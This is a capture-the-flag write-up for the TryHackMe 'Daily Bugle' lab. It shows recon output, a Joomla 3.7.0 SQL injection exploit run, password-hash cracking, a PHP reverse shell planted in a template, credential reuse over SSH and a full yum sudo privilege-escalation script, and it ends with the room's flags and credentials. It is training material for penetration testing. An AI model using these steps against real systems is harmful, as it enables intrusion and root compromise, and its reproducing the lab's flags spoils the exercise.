## TryHackMe Daily Bugle


### Task 1: Deploy

Inital Reconnaissance 

#### Nmap Scan
```
$ nmap -sV -sC 10.10.152.22 -oA recon/recon-dailybugle
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-09 05:45 EST
Nmap scan report for 10.10.152.22
Host is up (0.10s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 135.64 seconds
```

#### Gobuster Search
```
/language             (Status: 301) [Size: 237] [--> http://10.10.152.22/language/]
/media                (Status: 301) [Size: 234] [--> http://10.10.152.22/media/]
/templates            (Status: 301) [Size: 238] [--> http://10.10.152.22/templates/]
/images               (Status: 301) [Size: 235] [--> http://10.10.152.22/images/]
/includes             (Status: 301) [Size: 237] [--> http://10.10.152.22/includes/]
/administrator        (Status: 301) [Size: 242] [--> http://10.10.152.22/administrator/]
/plugins              (Status: 301) [Size: 236] [--> http://10.10.152.22/plugins/]
/components           (Status: 301) [Size: 239] [--> http://10.10.152.22/components/]
/bin                  (Status: 301) [Size: 232] [--> http://10.10.152.22/bin/]
/libraries            (Status: 301) [Size: 238] [--> http://10.10.152.22/libraries/]
/cache                (Status: 301) [Size: 234] [--> http://10.10.152.22/cache/]
/modules              (Status: 301) [Size: 236] [--> http://10.10.152.22/modules/]
/tmp                  (Status: 301) [Size: 232] [--> http://10.10.152.22/tmp/]
/layouts              (Status: 301) [Size: 236] [--> http://10.10.152.22/layouts/]
/cli                  (Status: 301) [Size: 232] [--> http://10.10.152.22/cli/]
```


To find out the Joomla version, there is an XML file at /administrator/manifests/files/joomla.xml that contains the Joomla version of 3.7.0, this was found after some research and of course, a StackOverflow article.

Reference: https://joomla.stackexchange.com/questions/7148/how-to-get-joomla-version-by-http

#### XML URL Result
```
This XML file does not appear to have any style information associated with it. The document tree is shown below.
<extension version="3.6" type="file" method="upgrade">
<name>files_joomla</name>
<author>Joomla! Project</author>
<authorEmail>admin@joomla.org</authorEmail>
<authorUrl>www.joomla.org</authorUrl>
<copyright>(C) 2005 - 2017 Open Source Matters. All rights reserved</copyright>
<license>GNU General Public License version 2 or later; see LICENSE.txt</license>
<version>3.7.0</version>
<creationDate>April 2017</creationDate>
<description>FILES_JOOMLA_XML_DESCRIPTION</description>

-- SNIP --
```

#### Searchsploit result
```
$ searchsploit Joomla 3.7.0 

---------------------------------------------------------------------
 Exploit Title                              |  Path
---------------------------------------------------------------------
 Joomla! 3.7.0 - 'com_fields' SQL Injection |  php/webapps/42033.txt
---------------------------------------------------------------------
Shellcodes: No Results
```


Searching about this exploit reveals a python script called joomblah.py that performs this. 

```
$ py2 joomblah.py http://10.10.40.190

-- SNIP --

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```


#### John the Ripper Output
```
john jonah.hash --wordlist=/usr/share/wordlists/rockyou.txt
--------------------------------------------------------------------------
The library attempted to open the following supporting CUDA libraries,
but each of them failed.  CUDA-aware support is disabled.
libcuda.so.1: cannot open shared object file: No such file or directory
libcuda.dylib: cannot open shared object file: No such file or directory
/usr/lib64/libcuda.so.1: cannot open shared object file: No such file or directory
/usr/lib64/libcuda.dylib: cannot open shared object file: No such file or directory
If you are not interested in CUDA-aware support, then run with
--mca opal_warn_on_missing_libcuda 0 to suppress this message.  If you are interested
in CUDA-aware support, then try setting LD_LIBRARY_PATH to the location
of libcuda.so.1 to get passed this issue.
--------------------------------------------------------------------------
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)
1g 0:00:04:15 DONE (2021-12-17 16:55) 0.003910g/s 183.1p/s 183.1c/s 183.1C/s thelma1..speciala
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```


From here the /administrator panel of Joomla can be accessed

Steps to gain shell off of Joomla
	1. Create PHP Reverse Shell -> /usr/share/webshells/php/php-reverse-shell
	2. In Joomla go to: Extensions -> Templates -> Templates
	3. Go the the beez3 template, or any available template
	4. Change index.php to the reverse shell
	5. Launch nc reverse shell
	6. Template Preview 
	7. Once the shell is obtained -> $ python -c 'import pty; pty.spawn("/bin/bash")'


The main files that a web server account has access to are /var/www/html

Looking inside /var/www/html

```
bash-4.2$ ls
ls
LICENSE.txt
cli
includes
media
tmp
README.txt
components
index.php
modules
web.config.txt
administrator
configuration.php
language
plugins

--SNIP--

```

The configuration.php file seems of interest.

```
bash-4.2$ cat configuration.php
cat configuration.php
<?php
class JConfig {
        public $offline = '0';

        -- SNIP --

        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'nv5uz9r3ZEDzVjNu';
        public $db = 'joomla';
        public $dbprefix = 'fb9j5_';
        public $live_site = '';
        public $secret = 'UAMBRWzHO3oFPmVC';
        public $gzip = '0';
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
        public $ftp_host = '127.0.0.1';
        public $ftp_port = '21';

```


A public password of 'nv5uz9r3ZEDzVjNu' can be seen in the configuration, this could be used to login to the jjameson account. 

```
ssh jjameson@10.10.135.177

jjameson@10.10.135.177's password:

Last login: Mon Dec 16 05:14:55 2019 from netwars

[jjameson@dailybugle ~]$ ls

user.txt

[jjameson@dailybugle ~]$ cat user.txt

27a260fe3cba712cfdedb1c86d80442e
```

$ sudo -l

Used yum gtfobins to escalate privileges 

https://gtfobins.github.io/gtfobins/yum/

```
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

Note: the python script says os.execl NOT os.exec

After this process I had root access

```
[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y                                                                            
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami
root
sh-4.2# pwd
/home/jjameson
sh-4.2# cd
sh-4.2# pwd
/root
sh-4.2# ls
anaconda-ks.cfg  root.txt
sh-4.2# cat root.txt
eec3d53292b1821868266858d7fa6f79
sh-4.2# Connection to 10.10.135.177 closed by remote host.
Connection to 10.10.135.177 closed.
```

